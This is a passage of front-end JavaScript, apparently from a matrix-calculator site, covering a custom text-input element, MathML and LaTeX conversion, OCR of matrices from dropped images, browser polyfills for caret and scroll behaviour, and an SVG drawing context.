      textOffset += p.text.length;
      lastNode = p.node;
      lastOffset = p.node.nodeType === Node.TEXT_NODE ? p.text.length : p.offset;
    }
    return {node: lastNode, offset: lastOffset};
  }
  function getTextOffset(contenteditable, selectionNode, selectionOffset) {
    if (selectionNode == null) {
      return null;
    }
    var textOffset = 0;
    for (var i = positions(contenteditable), x = i.next(); !x.done; x = i.next()) {
      var p = x.value;
      if (selectionNode.nodeType !== Node.TEXT_NODE && selectionNode === p.node && selectionOffset === p.offset) {
        return textOffset;
      }
      if (selectionNode.nodeType === Node.TEXT_NODE && selectionNode === p.node) {
        return textOffset + selectionOffset;
      }
      textOffset += p.text.length;
    }
    return compareCaretPositons(selectionNode, selectionOffset, contenteditable, 0) < 0 ? 0 : textOffset;
  }
  function getValue(contenteditable) {
    var value = '';
    for (var i = positions(contenteditable), x = i.next(); !x.done; x = i.next()) {
      var p = x.value;
      value += p.text;
    }
    return value;
  }
  function setSelectionRange(contenteditable, start, end) {
    var selection = window.getSelection();
    var s = getCaretPosition(contenteditable, start);
    var e = getCaretPosition(contenteditable, end);
    selection.setBaseAndExtent(s.node, s.offset, e.node, e.offset);
  }
  //TODO: Ctrl+A - rangeCount is 2
  function getSelectionDirection(contenteditable) {
    var selection = window.getSelection();
    var c = compareCaretPositons(selection.anchorNode, selection.anchorOffset, selection.focusNode, selection.focusOffset);
    return c < 0 ? 'forward' : 'none';
  }
  function getSelectionStart(contenteditable) {
    var selection = window.getSelection();
    var c = compareCaretPositons(selection.anchorNode, selection.anchorOffset, selection.focusNode, selection.focusOffset);
    return c < 0 ? getTextOffset(contenteditable, selection.anchorNode, selection.anchorOffset) : getTextOffset(contenteditable, selection.focusNode, selection.focusOffset);
  }
  function getSelectionEnd(contenteditable) {
    var selection = window.getSelection();
    var c = compareCaretPositons(selection.anchorNode, selection.anchorOffset, selection.focusNode, selection.focusOffset);
    return c < 0 ? getTextOffset(contenteditable, selection.focusNode, selection.focusOffset) : getTextOffset(contenteditable, selection.anchorNode, selection.anchorOffset);
  }

  function CustomInput() {
    return Reflect.construct(HTMLElement, [], CustomInput);
  }
  CustomInput.prototype = Object.create(HTMLElement.prototype);

  //class CustomInput extends HTMLElement {
  //  constructor() {
      // Always call super first in constructor
  //    super();
  //  }
  //}
  CustomInput.prototype.connectedCallback = function () {
    this.appendChild(document.createTextNode(''));
    this.setAttribute('role', 'textbox');
    this.tabIndex = 0; // to support spatial navigation polyfill
    this.setAttribute('contenteditable', 'true');

    var mo = new MutationObserver(function () {
      if (!this.hasChildNodes()) {
        // Firefox bug: https://stackoverflow.com/questions/16984287/why-text-align-right-doesnt-work-on-empty-contenteditable-element-in-firefox/16984412#16984412
        this.appendChild(document.createTextNode(''));
      }
      if (this.childElementCount !== 0) {
        var html = this.innerHTML;
        window.setTimeout(function () {
          throw new TypeError('element child: ' + html);
        }, 0);
      }
    }.bind(this));
    mo.observe(this, {childList: true, characterData: true, subtree: false});
  };
  CustomInput.prototype.select = function () {
    //setSelectionRange(this, 0, 1/0); - "insertText" is not working in Firefox
    window.getSelection().selectAllChildren(this);
  };
  CustomInput.prototype.setSelectionRange = function (start, end) {
    setSelectionRange(this, start, end);
  };
  CustomInput.prototype.setRangeText = function (text) {// call only in fallback cases
    this.value = this.value.slice(0, this.selectionStart) + text + this.value.slice(this.selectionEnd);
  };
  Object.defineProperty(CustomInput.prototype, 'value', {
    get: function () {
      return getValue(this);
    },
    set: function (value) {
      //throw new TypeError('CustomInput#value is not settable, use document.execCommand("insertText", false, value) instead');
      //TODO: multiline: <br /> or \n - ?
      //TODO: remove - ?
      while (this.firstElementChild != null) {
        this.firstElementChild.remove();
      }
      this.firstChild.textContent = value;
      while (this.firstChild.nextSibling != null) {
        this.firstChild.nextSibling.remove();
      }
    }
  });
  Object.defineProperty(CustomInput.prototype, 'selectionDirection', {
    get: function () {
      return getSelectionDirection(this);
    }
  });
  Object.defineProperty(CustomInput.prototype, 'selectionStart', {
    get: function () {
      return getSelectionStart(this);
    }
  });
  Object.defineProperty(CustomInput.prototype, 'selectionEnd', {
    get: function () {
      return getSelectionEnd(this);
    }
  });
  Object.defineProperty(CustomInput.prototype, 'placeholder', {
    get: function () {
      return this.getAttribute('aria-placeholder');
    },
    set: function (value) {
      this.setAttribute('aria-placeholder', value);
    }
  });

  if (window.customElements != null) {
    //TODO: older Firefox versions (?)
    window.customElements.define('custom-input', CustomInput);
  }
  
  CustomInput.testables = {
    getValue: getValue,
    getSelectionEnd: getSelectionEnd,
    getSelectionStart: getSelectionStart
  };
  window.CustomInput = CustomInput;

}());
}

/*global transformMathML, XMLSerializer, DOMParser */

(function () {
  "use strict";

function decodeURIComponentSafe(string) {
  var validPercentEncoding = /(?:%[0-7][0-9A-F]|%(?!C[0-1])[C-D][0-9A-F]%[8-9A-B][0-9A-F]|%(?!E0%[8-9])(?!ED%[A-B])E[0-9A-F](?:%[8-9A-B][0-9A-F]){2}|%(?!F0%8)(?!F4%[9A-B])F[0-4](?:%[8-9A-B][0-9A-F]){3}|[^%])+/gi;
  return string.replace(validPercentEncoding, function (p) {
    return decodeURIComponent(p);
  });
}


//=getMatrix4
//?
var getTableFromAsciiMathMatrix = function (input) {
  // return RPN(s).matrix.getElements();
  var rows = [[]];
  var cellStart = 0;
  var b = 0;
  for (var i = 0; i < input.length; i += 1) {
    var c = input.charCodeAt(i);
    if (c === "{".charCodeAt(0)) {
      b += 1;
      if (b === 2) {
        cellStart = i + 1;
      }
    } else if (c === "}".charCodeAt(0)) {
      if (b === 2) {
        rows[rows.length - 1].push(input.slice(cellStart, i));
      } else if (b === 0) {
        return null;
      }
      b -= 1;
    } else if (c === ",".charCodeAt(0)) {
      if (b === 2) {
        rows[rows.length - 1].push(input.slice(cellStart, i));
        cellStart = i + 1;
      } else if (b === 1) {
        rows.push([]);
      } else if (b === 0) {
        return null;
      }
    } else if (c === "(".charCodeAt(0)) {
      if (b < 2) {
        return null;
      }
      b += 1;
    } else if (c === ")".charCodeAt(0)) {
      if (b < 3) {
        return null;
      }
      b -= 1;
    } else if (/[^\s]/.test(String.fromCharCode(c))) {
      if (b < 2) {
        return null;
      }
    }
  }
  return rows;
};

var serializeMathML = function (element) {
  var mathml = new XMLSerializer().serializeToString(element).replace(/\sxmlns="[^"]+"/g, '');
  mathml = mathml.replace(/[\u2061]/g, '&#x2061;'); // &af; or &ApplyFunction; are not supported when pasting XML into Word
  mathml = '<math xmlns="http://www.w3.org/1998/Math/MathML">' + mathml + '</math>';
  return formatXml(mathml);
};

var parseMathML = function (mathml) {
  mathml = mathml.replace(/&[A-Za-z]+;/gi, function (entity) {
    return new DOMParser().parseFromString(entity, "text/html").documentElement.textContent;
  });
  return new DOMParser().parseFromString(mathml, "text/xml").firstChild;
};

var mathmlToLaTeX = function (element) {
  return transformMathML(element, "LaTeX").string;
};

// TODO: remove "matrix containers" ({useMatrixContainer: false})
var serializeMatrixContainer = function (matrixContainer) {
  if (matrixContainer.getAttribute('data-matrix') != null && matrixContainer.firstElementChild.nextElementSibling === null) {
    matrixContainer = matrixContainer.firstElementChild;
    matrixContainer = matrixContainer.cloneNode(true);
    // Removal of extra attributes added by "MathML polyfill":
    //TODO: href, draggable, tabindex - ?
    matrixContainer.removeAttribute('style');
    matrixContainer.removeAttribute('class');
    var es = matrixContainer.querySelectorAll('*');
    for (var i = 0; i < es.length; i += 1) {
      es[i].removeAttribute('style');//TODO: remove
      es[i].removeAttribute('class');//TODO: remove
    }
  }

  // TODO: https://www.w3.org/TR/clipboard-apis/#writing-to-clipboard
  return serializeMathML(matrixContainer);
};

var formatXml = function (xml) {
  // https://stackoverflow.com/questions/376373/pretty-printing-xml-with-javascript
  // Note: /.<\/\w[^>]*>$ is faster than /.+<\/\w[^>]*>$
  var formatted = '';
  var padding = '';
  var nodes = xml.replace(/></g, '>\n<').split('\n');
  for (var i = 0; i < nodes.length; i += 1) {
    var node = nodes[i];
    var indent = '';
    if (!/.<\/\w[^>]*>$/.test(node)) {
      if (/^<\/\w/.test(node)) {
        padding = padding.slice(0, 0 - '  '.length);
      } else {
        if (/^<\w[^>]*[^\/]>.*$/.test(node)) {
          indent = '  ';
        }
      }
    }
    formatted += padding + node + '\n';
    padding += indent;
  }
  return formatted;
};

var getMatrixFromTextBlocks = function (textBlocks) {
  //! no new lines, no spaces

  function splitBlocks(textBlocks, type) {
    function m(text) {
      return type === "rows" ? text.boundingBox.y + text.boundingBox.height / 2 : text.boundingBox.x + text.boundingBox.width / 2;
    }
    function rowMiddle(row) {
      var result = 0;
      for (var j = 0; j < row.length; j += 1) {
        result = (result * j + m(row[j])) / (j + 1);
      }
      return result;
    }
    var rows = [];
    for (var n = 0; n < textBlocks.length; n += 1) {
      var text = textBlocks[n];
      var middle = m(text);
      var rowIndex = -1;
      for (var i = 0; i < rows.length; i += 1) {
        var row = rows[i];
        if (Math.abs((rowMiddle(row) - middle) / (type === "rows" ? text.boundingBox.height : text.boundingBox.width)) < 0.75) {
          rowIndex = i;
        }
      }
      if (rowIndex === -1) {
        rows.push([]);
        rowIndex = rows.length - 1;
      }
      rows[rowIndex].push(text);
    }
    rows.sort(function (a, b) {
      return rowMiddle(a) - rowMiddle(b);
    });
    return rows;
  }

  textBlocks = textBlocks.filter(function (textBlock) {
    return /[^\(\)\[\]\|]/.test(textBlock.rawValue);//TODO: ?
  });
  var rows = splitBlocks(textBlocks, "rows");
  var cols = splitBlocks(textBlocks, "cols");

  var table = new Array(rows.length);
  for (var i = 0; i < rows.length; i += 1) {
    table[i] = new Array(cols.length);
    for (var j = 0; j < cols.length; j += 1) {
      table[i][j] = '';
    }
  }

  for (var n = 0; n < textBlocks.length; n += 1) {
    var text = textBlocks[n];
    var rowIndex = -1;
    for (var i = 0; i < rows.length; i += 1) {
      if (rows[i].indexOf(text) !== -1) {
        rowIndex = i;
      }
    }
    var colIndex = -1;
    for (var i = 0; i < cols.length; i += 1) {
      if (cols[i].indexOf(text) !== -1) {
        colIndex = i;
      }
    }
    table[rowIndex][colIndex] += text.rawValue;
  }

  return table.map(function (x) {
    return x.join(' ');
  }).join('\n');
};


  var html2html = function (container) {
    var clone = container.cloneNode(true);
    var walk = function (node) {
      if (node.tagName.toLowerCase() === 'script' || node.tagName.toLowerCase() === 'iframe') {
        node.parentNode.removeChild(node);
      } else if (node.tagName.toLowerCase() === 'link') {
        if (node.getAttribute('rel') === 'stylesheet') {
          node.setAttribute('href', node.href); // set to an absolute URL
        } else {
          node.parentNode.removeChild(node);
        }
      } else if (node.tagName.toLowerCase() === 'input') {
        node.setAttribute('value', node.value);
      } else if (node.tagName.toLowerCase() === 'textarea') {
        node.textContent = node.value;
      }
      var next = node.firstElementChild;
      while (next != null) {
        var c = next;
        next = next.nextElementSibling; // as c could be removed
        walk(c);
      }
    };
    walk(clone);
    return new XMLSerializer().serializeToString(clone);
  };

  globalThis.sendSnapshot = function () {
    var activeElement = document.querySelector(":focus");
    if (activeElement != null) {
      activeElement.setAttribute("data-state", "focus");
      activeElement.setAttribute("autofocus", "autofocus"); // as huge snapshot may be truncated and style can be cutted out
    }
    var snapshot = html2html(document.documentElement);
    if (activeElement != null) {
      activeElement.removeAttribute("data-state");
      activeElement.removeAttribute("autofocus");
    }
    snapshot += "<style>[data-state=\"focus\"] { outline: 2px solid green; } </style>";
    var dataURL = "data:text/html;charset=utf-8," + snapshot.replace(/%/g, '%25').replace(/#/g, '%23');
    globalThis.onerror(dataURL, "snapshot.js", 0, 0, undefined);
  };

  // TODO: remove?
  // an array of array of strings -> string
  var toMultilineString = function (array) {
    var table = new Array(array.length);
    for (var i = 0; i < array.length; i += 1) {
      var elements = array[i];
      var row = new Array(elements.length);
      for (var j = 0; j < elements.length; j += 1) {
        row[j] = elements[j].toString().trim();
      }
      table[i] = row;
    }
    var columns = 0;
    for (var i = 0; i < array.length; i += 1) {
      columns = Math.max(columns, array[i].length);
    }
    var columnWidths = new Array(columns);
    for (var i = 0; i < columns; i += 1) {
      columnWidths[i] = 0;
    }
    for (var i = 0; i < table.length; i += 1) {
      var row = table[i];
      for (var j = 0; j < row.length; j += 1) {
        columnWidths[j] = Math.max(columnWidths[j], row[j].length);
      }
    }
    var result = '';
    for (var i = 0; i < table.length; i += 1) {
      var row = table[i];
      result += (i !== 0 ? '\n' : '');
      for (var j = 0; j < columns; j += 1) {
        var e = j < row.length ? row[j] : '';
        result += (j !== 0 ? '\t' : '') + ' '.repeat(columnWidths[j] - e.length) + e;
      }
    }
    return result;
  };

  globalThis.getTableFromAsciiMathMatrix = getTableFromAsciiMathMatrix;
  //globalThis.serializeMathML = serializeMathML;
  globalThis.parseMathML = parseMathML;
  globalThis.formatXml = formatXml;
  globalThis.toMultilineString = toMultilineString;
  globalThis.mathmlToLaTeX = mathmlToLaTeX;
  globalThis.serializeMatrixContainer = serializeMatrixContainer;
  globalThis.getMatrixFromTextBlocks = getMatrixFromTextBlocks;

  if (typeof TextDetector === 'undefined') {
    globalThis.TextDetector = function () {
    };
    globalThis.TextDetector.prototype.detect = function (image) {
      var pathPrefix = PageUtils.ROOT_PATH + 'js';
      var worker = null;
      return PageUtils.$import(pathPrefix + '/tesseract.js/tesseract.min.js').then(function () {
        var createWorker = Tesseract.createWorker;
        return createWorker({
          workerPath: pathPrefix + '/tesseract.js/worker.min.js',
          langPath: pathPrefix + '/lang-data',
          corePath: pathPrefix + '/tesseract.js-core/tesseract-core-simd.wasm.js',
          logger: function (m) { return console.log(m); }
        });
      }).then(function (w) {
        worker = w;
        return worker.load();
      }).then(function () {
        return worker.loadLanguage('digits_comma+eng+equ');
      }).then(function () {
        return worker.initialize('digits_comma+eng+equ');
      }).then(function () {
        var dashes = '-\u2011\u2012\u2013\u2014\u2015\u2212';
        return worker.setParameters({
          tessedit_char_whitelist: '\t 0123456789.,' + dashes,
          preserve_interword_spaces: '1',
          tessedit_pageseg_mode: '11' // PSM.SPARSE_TEXT
        });
      }).then(function () {
        return worker.recognize(image);
      }).then(function (tmp) {
        var data = tmp.data;
        console.log(data);
        var textBlocks = [];
        for (var i = 0; i < data.lines.length; i += 1) {
          var line = data.lines[i];
          for (var j = 0; j < line.words.length; j += 1) {
            var word = line.words[j];
            textBlocks.push({
              rawValue: word.text,
              boundingBox: {
                x: word.bbox.x0,
                y: word.bbox.y0,
                widths: word.bbox.x1 - word.bbox.x0,
                height: word.bbox.y1 - word.bbox.y0
              }
            });
          }
        }
        return textBlocks;
      });
    };
  }

globalThis.dndGetTextData = function (dataTransfer, callback) {
  //TODO: MathML support (?)
  // MathML in text
  var text = dataTransfer.getData('text/plain') || '';

  var onSVGReady = function (text) {
    //TODO: svg with errors
    var svg = new DOMParser().parseFromString(text, 'image/svg+xml').firstElementChild;
    document.body.appendChild(svg);
    var textBlocks = [];
    var es = svg.querySelectorAll('text');
    for (var i = 0; i < es.length; i += 1) {
      var text = es[i];
      textBlocks.push({
        boundingBox: text.getBoundingClientRect(),
        rawValue: text.textContent
      });
    }
    text = getMatrixFromTextBlocks(textBlocks);
    callback(text);
  };

  // for tests:
  if (/^data\:image\/svg\+xml?,/.test(text)) {
    onSVGReady(decodeURIComponentSafe(text.slice(text.indexOf(',') + 1)));
    return null;
  }

  //!new 2020-04-05
  var files = dataTransfer.files || [];

  // a file OR a data URL or a link
  var hasImageFile = files.length === 1 && files[0].type.indexOf('image/') === 0;
  var hasImageLink = /^data\:image\/\S+\,/.test(text) || /^(ftp|https?)\:\S+/.test(text)
  var hasSVG = /^data\:image\/svg\+xml[;,]/.test(text) || files.length === 1 && files[0].type === 'image/svg+xml';

  if ((typeof TextDetector !== 'undefined' || hasSVG) && (text === '' && hasImageFile || hasImageLink)) {
    // prefet file as link fetching can be disabled because of CSP
    (text.startsWith('data:') || hasImageLink && !hasImageFile ? fetch(text, {credentials: 'include'}).then(function (response) { return response.blob(); }) : Promise.resolve(files[0])).then(function (imageFile) {
      if (imageFile.type === 'image/svg+xml') {
        imageFile.text().then(onSVGReady);
      } else {
        var loadImage = function (imageFile) {
          return new Promise(function (resolve, reject) {
            var src = URL.createObjectURL(imageFile);
            var img = new Image();
            img.onload = function () {
              //TODO:
              // tesseract still needs the image URL (?)
              //URL.revokeObjectURL(url);
              resolve(img);
            };
            img.onerror = function (error) {
              //TODO:
              // tesseract still needs the image URL (?)
              //URL.revokeObjectURL(url);
              reject(error);
            };
            img.src = src;
          });
        };
        // Uncaught (in promise) Error: NotSupportedError: Unsupported source. in Chrome 86 for File
        loadImage(imageFile).then(function (img) {
          var textDetector = new TextDetector();
          textDetector.detect(img).then(function (textBlocks) {
            if (textBlocks.length === 0) {
              throw new Error('no text blocks detected');
            }
            var text = getMatrixFromTextBlocks(textBlocks);
            callback(text);
          })['catch'](function (error) {
            throw new Error(error);
          });
        });
      }
    });
    return null;
  }

  // 1x+2y=0
  // 3x+4y=0

  // {{1,2},{3,4}}

  // 1\t2\t3
  // 4\t5\t6
  // 7\t8\t9
  var mathText = (text || dataTransfer.getData('application/mathml-presentation+xml') || '').trim();
  if (/^<m[a-z]+[^>]*>/.test(mathText) && /<\/m[a-z]+>*$/.test(mathText)) {
    text = transformMathML(parseMathML(mathText), 'AsciiMath').string;
    callback(text);
    return null;
  }

  callback(text);
  return null;
};

}());

/*global document, window, Element, HTMLInputElement, CSS */

// TODO: Firefox bug, Edge bug
// Firefox 111(latest for now) + ? does not scroll while dragover for <input>
// IE does not scroll while dragover for <input>
if (!("webkitUserDrag" in document.documentElement.style)) { //TODO: proper detection
  var lastScrollLeft = 0;
  document.addEventListener('dragover', function (event) {
    var input = event.target;//document.elementFromPoint(event.clientX, event.clientY);
    if (input.matches('input')) {
      var scrollLeft = input.scrollLeft;
      if (lastScrollLeft === scrollLeft) { // The skip if the web browser has the support of this feature
        var rect = input.getBoundingClientRect();
        var distanceToLeftEdge = event.clientX - rect.left;
        var distanceToRightEdge = input.clientWidth - (event.clientX - rect.left);
        var dx = distanceToLeftEdge < 9 ? -6 : (distanceToRightEdge < 9 ? +6 : 0);
        if (dx + scrollLeft < 0) {
          dx = -scrollLeft;
        }
        //dx = Math.min(dx, input.scrollWidth - input.clientWidth);
        if (dx !== 0) {
          input.scrollLeft = scrollLeft + dx;// input.scrollBy() is not supported in Edge 18
        }
      }
      lastScrollLeft = scrollLeft;
    }
  });
}


// Firefox < 20, Chrome, Edge, Opera, Safari
if (document.caretPositionFromPoint == undefined) {

  var createElementLikeInput = function (input, contentCallback, callback) {
    "use strict";
    var inputStyle = window.getComputedStyle(input, undefined);

    var scrollLeft = input.scrollLeft;
    var scrollTop = input.scrollTop;

    var inputRect = input.getBoundingClientRect();

    var div = document.createElement("div");
    contentCallback(div);
    div.style.position = "absolute";
    div.style.display = "inline-block";

    div.style.margin = "0px";
    div.style.border = "0px solid transparent";

    div.style.paddingLeft = inputStyle.paddingLeft;
    div.style.paddingRight = inputStyle.paddingRight;
    div.style.paddingTop = inputStyle.paddingTop;
    div.style.paddingBottom = inputStyle.paddingBottom;

    div.style.left = (inputRect.left + window.pageXOffset + input.clientLeft).toString() + "px";
    div.style.top = (inputRect.top + window.pageYOffset + input.clientTop).toString() + "px";
    div.style.width = input.clientWidth.toString() + "px";
    div.style.height = input.clientHeight.toString() + "px";

    if ("boxSizing" in div.style) {
      div.style.boxSizing = "border-box";
    }
    if ("MozBoxSizing" in div.style) {
      div.style.MozBoxSizing = "border-box";
    }
    if ("webkitBoxSizing" in div.style) {
      div.style.webkitBoxSizing = "border-box";
    }

    div.style.whiteSpace = input.tagName.toLowerCase() === 'input' ? 'nowrap' : 'pre';
    div.style.wordWrap = inputStyle.wordWrap;

    // Firefox does not like font
    div.style.fontSize = inputStyle.fontSize;
    div.style.fontFamily = inputStyle.fontFamily;
    div.style.overflow = "hidden";
    div.style.visibility = "visible"; // Opera 12 needs visible
    div.style.zIndex = "100000";//?

    document.body.appendChild(div);
    div.scrollLeft = scrollLeft;
    div.scrollTop = scrollTop;
    var result = callback(div);
    div.parentNode.removeChild(div);
    return result;
  };

  document.caretPositionFromPoint = function (x, y) {
    "use strict";
    var element = document.elementFromPoint(x, y);
    if (element.tagName.toLowerCase() !== 'input' &&
        element.tagName.toLowerCase() !== 'textarea') {
      var caretRange = document.caretRangeFromPoint(x, y);
      return {
        offsetNode: caretRange.startContainer,
        offset: caretRange.startOffset
      };
    }
    var input = element;
    var offset = createElementLikeInput(input, function (div) {
      var value = input.value.replace(/\r\n/g, "\n") + "\n"; // IE - \r\n
      div.textContent = value;
    }, function () {
      return document.caretRangeFromPoint(x, y).startOffset;
    });
    return {
      offsetNode: input,
      offset: offset
    };
  };

  var hasSetSelectionRangeScrollToVisibilityBug = function (callback) {
    window.setTimeout(function () {
      var input = document.createElement('input');
      input.style.position = 'fixed';
      input.style.left = '-20px';
      input.style.top = '-2em';
      input.style.width = '10px';
      input.style.height = '1em';
      input.style.opacity = '0';
      input.style.overflow = 'hidden';
      input.value = 'x'.repeat(1000);
      document.documentElement.appendChild(input);
      window.requestAnimationFrame(function () {
        var activeElement = document.activeElement;
        input.focus({preventScroll: true});
        input.scrollLeft = 0;
        input.setSelectionRange(999, 1000);
        if (activeElement != null) {
          activeElement.focus({preventScroll: true});
        } else {
          input.blur();
        }
        window.setTimeout(function () {
          var ok = input.scrollLeft !== 0;
          callback(!ok);
          window.requestIdleCallback(function () {
            window.requestAnimationFrame(function () {
              input.parentNode.removeChild(input);
            });
          });
        }, 1000);
      });
    }, 300);
  };

  // Chrome 80
  // https://bugs.chromium.org/p/chromium/issues/detail?id=331233
  if (HTMLInputElement.prototype.createTextRange == null &&
      HTMLInputElement.prototype.setSelectionRange != null) {
  hasSetSelectionRangeScrollToVisibilityBug(function () {
    // Range.prototype.getBoundingClientRect is null in Opera Mini
    // Range.prototype.getBoundingClientRect isnull in Firefox < 4
    // Range#getBoundingClientRect returns null on Android 4.4
    var nativeSetSelectionRange = HTMLInputElement.prototype.setSelectionRange;
    HTMLInputElement.prototype.setSelectionRange = function (selectionStart, selectionEnd) {
      "use strict";
      nativeSetSelectionRange.call(this, selectionStart, selectionEnd);
      //var position = selectionstart;
      var input = this;
      var result = createElementLikeInput(input, function (div) {
        var span1 = document.createElement('span');
        span1.textContent = input.value.slice(0, input.selectionStart);
        div.appendChild(span1);
        var span2 = document.createElement('span');
        span2.textContent = input.value.slice(input.selectionStart, input.selectionEnd);
        div.appendChild(span2);
        var span3 = document.createElement('span');
        span3.textContent = input.value.slice(input.selectionEnd);
        div.appendChild(span3);
      }, function (div) {
        var rect = div.firstElementChild.nextElementSibling.getBoundingClientRect();
        var inputClientRect = div.getBoundingClientRect();
        return {
          scrollLeft: rect.right - inputClientRect.right,
          scrollTop: rect.bottom - inputClientRect.bottom
        };
      });
      input.scrollLeft += result.scrollLeft;
      input.scrollTop += result.scrollTop;
    };
  });
  }

}

(function () {
  // as the "scroll" event is not supported in Chrome
  // UPDATE: it is supported in Chrome 113 somehow (?)
  // not supported in Safari 16.1
  // https://github.com/w3c/csswg-drafts/issues/4376
  var isScrollEventSupported = function (callback) {
    var input = document.createElement('input');
    input.style.position = 'fixed';
    input.style.left = '0px';
    input.style.top = '0px';
    input.style.width = '32px';
    input.style.height = '32px';
    input.style.opacity = '0';
    input.style.overflow = 'hidden';
    var c = 0;
    input.addEventListener('scroll', function (event) {
      c += 1;
    }, false);
    (document.documentElement || document.body).appendChild(input);
    input.value = 'x'.repeat(1000);
    //input.setSelectionRange(input.value.length, input.value.length);
    input.scrollLeft = 10000;
    // double rAF to be able to get some delayed scroll events (?)
    window.requestAnimationFrame(function () {
      window.requestAnimationFrame(function () {
        window.requestIdleCallback(function () {
          window.requestAnimationFrame(function () {
            input.parentNode.removeChild(input);
          });
        });
        var scrollEventSupport = c !== 0;
        callback(scrollEventSupport);
      });
    });
  };
  var polyfillScrollEventOnInput = function () {
    var lastScrollLeft = -1;
    var lastInput = null;
    var f = function (event) {
      if (event.target != null && event.target.nodeType === Node.ELEMENT_NODE && event.target.tagName.toLowerCase() === 'input') {
        var input = event.target;
        if (lastInput !== input) {
          lastScrollLeft = -1;
        }
        lastInput = input;
        var scrollLeft = input.scrollLeft;
        if (scrollLeft !== lastScrollLeft) {
          lastScrollLeft = scrollLeft;
          var scrollEvent = document.createEvent("Event");
          scrollEvent.initEvent("scroll", false, false);
          input.dispatchEvent(scrollEvent);
        }
      }
    };
    // wheel : Shift + mousewheel
    // dragover : https://stackoverflow.com/questions/27713057/event-to-detect-when-the-text-in-an-input-is-scrolled
    var events = ['keydown', 'keyup', 'mousedown', 'mouseup', 'mousemove', 'touchmove', 'input', 'focus', 'blur', 'wheel', 'dragover'];
    for (var i = 0; i < events.length; i += 1) {
      document.addEventListener(events[i], f, events[i] === 'wheel' || events[i] === 'touchmove' ? {passive: true} : true);
    }
  };
  window.setTimeout(function () {
    isScrollEventSupported(function (supported) {
      if (!supported) {
        polyfillScrollEventOnInput();
      }
    });
  }, 300);
}());

/*global document*/

(function () {
"use strict";

function round(v) {
  return (Math.floor(Math.pow(10, 6) * v + 0.5) / Math.pow(10, 6)).toString();
}

// see https://github.com/gliffy/canvas2svg/blob/master/canvas2svg.js
// canvas like API
function SVGRenderingContext2D(svg) {
  // public
  this.font = "normal 10px sans-serif";
  this.textBaseline = "alphabetic";
  this.textAlign = "start";
  // private
  this.svg = svg;
  this.svg.setAttribute("font-size", "16");//?
  this.svg.setAttribute("text-anchor", "middle");
  this.svg.setAttribute("fill", "currentColor");
  this.x = 0;
  this.y = 0;
  this.sx = 1;
  this.sy = 1;
  this.px = 0;
  this.py = 0;
}
SVGRenderingContext2D.prototype.translate = function (dx, dy) {
  this.x += dx;
  this.y += dy;
};
SVGRenderingContext2D.prototype.scale = function (sx, sy) {
  this.sx *= sx;
  this.sy *= sy;
  this.x /= sx;
  this.y /= sy;
};
SVGRenderingContext2D.prototype.fillText = function (text, dx, dy) {
  if (this.textBaseline !== "middle" || this.textAlign !== "center") {
    throw new RangeError();
  }
  var match = /^(italic|normal)\s+(normal|bold|\d+)?\s+(\d+(?:\.\d+)?)px\s(serif)$/.exec(this.font);
  if (match == null) {
    throw new RangeError();
  }
  var fontStyle = match[1];
  var fontWeight = match[2] || "normal";
  var fontSize = Number.parseFloat(match[3]);
  var e = document.createElementNS("http://www.w3.org/2000/svg", "text");
  e.setAttribute("x", round(this.x + dx));
  e.setAttribute("y", round(this.y + dy));
  if (round(this.sx) !== round(1) || round(this.sy) !== round(1)) {
    e.setAttribute("transform", "scale(" + round(this.sx) + ", " + round(this.sy) + ")");
    //e.setAttribute("dominant-baseline", "middle");//!TODO: FIX!
  }
  if (fontStyle !== "normal") {
    e.setAttribute("font-style", fontStyle);
  }
  if (fontWeight !== "normal" && fontWeight !== "400") {
    e.setAttribute("font-weight", fontWeight);
  }
  if (fontSize !== 16) {
    e.setAttribute("font-size", round(fontSize));
  }
  e.setAttribute("dy", "0.25em"); //TODO: FIX
  //e.setAttribute("text-anchor", "middle");
  //e.setAttribute("dominant-baseline", "central");
  // not supported in Opera, in Edge, in IE, in Safari (no "text-after-edge")
  //e.setAttribute("dominant-baseline", "text-after-edge");
  e.textContent = text;
  this.svg.appendChild(e);
};

SVGRenderingContext2D.prototype.measureText = function (text) {
  // TODO: performance
  // http://wilsonpage.co.uk/introducing-layout-boundaries/
  var tmp = document.getElementById("measure-text-element");
  if (tmp == null) {
    tmp = document.createElement("div");
    tmp.id = "measure-text-element";
    tmp.style.position = "fixed";
    tmp.style.top = "0px"; // affects layout root in Chrome
    tmp.style.left = "0px"; // affects layout root in Chrome
    tmp.style.whiteSpace = "nowrap";
    tmp.style.width = "0px";
    tmp.style.height = "0px";
    tmp.style.overflow = "hidden";
    tmp.style.visibility = "hidden";
    tmp.style.contain = "strict";//TODO: ?
    var span = document.createElement("span");
    span.style.font = "normal 16px serif";
    span.textContent = " ";
    tmp.appendChild(span);
    document.body.appendChild(tmp);
  }
  var span = tmp.querySelector("span");
  span.style.font = this.font;
  span.firstChild.textContent = text; //Note: on the TextNode
  var rect = span.getBoundingClientRect();
  var width = rect.right - rect.left;
  //tmp.parentNode.removeChild(tmp);
  return {
    width: width
  };
};

SVGRenderingContext2D.prototype.beginPath = function () {
};
SVGRenderingContext2D.prototype.moveTo = function (x, y) {
  this.px = x;
  this.py = y;
};
SVGRenderingContext2D.prototype.lineTo = function (x, y) {
  var e = document.createElementNS("http://www.w3.org/2000/svg", "line");
  e.setAttribute("x1", round(this.x + this.px));
  e.setAttribute("y1", round(this.y + this.py));
  e.setAttribute("x2", round(this.x + x));
  e.setAttribute("y2", round(this.y + y));
  e.setAttribute("stroke", "currentColor");
  this.svg.appendChild(e);
};
SVGRenderingContext2D.prototype.ellipse = function (cx, cy, rx, ry) {
  var e = document.createElementNS("http://www.w3.org/2000/svg", "ellipse");
  e.setAttribute("cx", round(this.x + cx));
  e.setAttribute("cy", round(this.y + cy));
  e.setAttribute("rx", round(rx));
  e.setAttribute("ry", round(ry));
  e.setAttribute("stroke", "currentColor");
  e.setAttribute("fill", "none");
  this.svg.appendChild(e);
};
SVGRenderingContext2D.prototype.stroke = function () {
};

globalThis.SVGRenderingContext2D = SVGRenderingContext2D;

}());

/*global SVGRenderingContext2D, console, document, XMLSerializer*/

(function () {
"use strict";

// see https://github.com/ForbesLindesay-Unmaintained/mathml-to-svg/pulls
function MathMLToSVG() {
}

MathMLToSVG.getFontSize = function (scriptlevel) {
  return Math.floor(16 * Math.pow(0.8, scriptlevel) + 0.5);
};

MathMLToSVG.makeFont = function (fontStyle, node, fontSize) {
  var fontWeight = window.getComputedStyle(node, null).fontWeight;
  return fontStyle + " " + fontWeight + " " + fontSize + "px" + " " + "serif";
};

MathMLToSVG.measure = function (context, node, scriptlevel) {
